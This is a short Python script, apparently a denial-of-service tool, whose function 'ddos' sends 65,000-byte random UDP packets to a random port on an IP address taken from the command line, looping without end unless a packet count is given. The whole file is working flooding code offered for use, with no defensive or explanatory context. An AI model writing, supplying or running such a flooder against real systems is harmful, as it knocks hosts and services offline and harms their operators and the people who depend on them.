#!/usr/bin/env python3
#coding=utf-8

from socket import socket as skt,AF_INET,SOCK_DGRAM

import sys,os,random





def ddos(TARGET,count=False):

    data = os.urandom(65000)

    port = random.randint(2500,65000)
    
    s = skt(AF_INET,SOCK_DGRAM)
    
    if count:
        for i in range(count):
            s.sendto(data,(TARGET,port))
    else:
        while True:
            s.sendto(data,(TARGET,port))
    
    s.close()

    


dst_ip = sys.argv[1]

try:
    ddos(dst_ip)
except KeyboardInterrupt:
    pass

